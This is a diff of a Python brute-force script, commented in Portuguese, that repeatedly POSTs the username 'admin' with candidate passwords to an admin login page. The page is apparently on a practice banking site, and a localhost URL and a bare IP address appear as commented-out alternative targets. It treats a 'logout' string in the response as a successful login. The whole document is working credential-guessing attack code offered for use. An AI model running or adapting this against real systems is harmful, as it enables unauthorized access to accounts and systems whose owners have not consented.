@@ -17,9 +17,9 @@ CONT = 0                    # Contadores de senhas
 SENHAS_TESTADAS = set()     # Conjunto
 SENHA_ENCONTRADA = False    # Flag
 
+#url = "http://127.0.0.1/4/login.php"
 #url = "http://44.203.221.183/admin/index.php"
 url = "http://advanced.bancocn.com/admin/index.php"
-
 
 def analise(resp, data):
 
@@ -35,6 +35,7 @@ def analise(resp, data):
 
         else:
             CONT += 1
+            SENHAS_TESTADAS.add(senha)
 
             if "logout" in html:
                 print(f"{CONT}) Senha {Fore.LIGHTBLUE_EX}'{senha}': {Fore.LIGHTCYAN_EX} correta !{Fore.RESET}")
@@ -45,7 +46,6 @@ def analise(resp, data):
             else:
                 print(f"{CONT}) Senha {Fore.LIGHTYELLOW_EX}'{senha}': {Fore.LIGHTRED_EX}Nao correta !{Fore.RESET}")
 
-            SENHAS_TESTADAS.add(senha)
         return None
 
 
@@ -66,6 +66,7 @@ def execucao():
 
                 else:
                     data = {"user": "admin", "password": i}
+                    #data = {"username": "admin", "password": i}
 
                     # Requisicao POST + Entrada de dados
                     resp = post(url, data)
@@ -75,10 +76,11 @@ def execucao():
         print(e)
 
     except Exception as e:
-        print(e)
+        print(f"Erro {e}")
 
     except KeyboardInterrupt:
         print("Programa finalizado\n")
+        exit(0)
 
 
 # Metodo: Principal
